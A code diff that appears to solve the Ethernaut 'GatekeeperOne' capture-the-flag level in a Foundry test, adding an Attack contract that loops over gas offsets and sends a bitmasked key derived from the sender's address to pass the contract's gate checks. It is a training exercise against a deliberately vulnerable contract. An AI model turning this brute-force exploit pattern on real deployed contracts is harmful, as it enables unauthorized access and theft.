@@ -27,6 +27,7 @@ contract TestGatekeeperOne is BaseTest {
     function setupLevel() internal override {
         /** CODE YOUR SETUP HERE */
 
+
         levelAddress = payable(this.createLevelInstance(true));
         level = GatekeeperOne(levelAddress);
 
@@ -38,7 +39,24 @@ contract TestGatekeeperOne is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         // Solve the Challenge
-
+        vm.startPrank(player, player);
+        Attack attack = new Attack(levelAddress);
+        attack.attack();
         assertEq(level.entrant(), player);
+    }
+}
+
+contract Attack {
+    GatekeeperOne private level;
+    constructor(address _target) public {
+        level = GatekeeperOne(_target);
+    }
+
+    function attack() public {
+        for (uint i = 0; i < 300; i++) {
+            (bool succ, ) = address(level).call{gas : i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", (bytes8(uint64(msg.sender))) & 0xFFFFFFFF0000FFFF));
+            if (succ)
+                break;
+        }
     }
 }
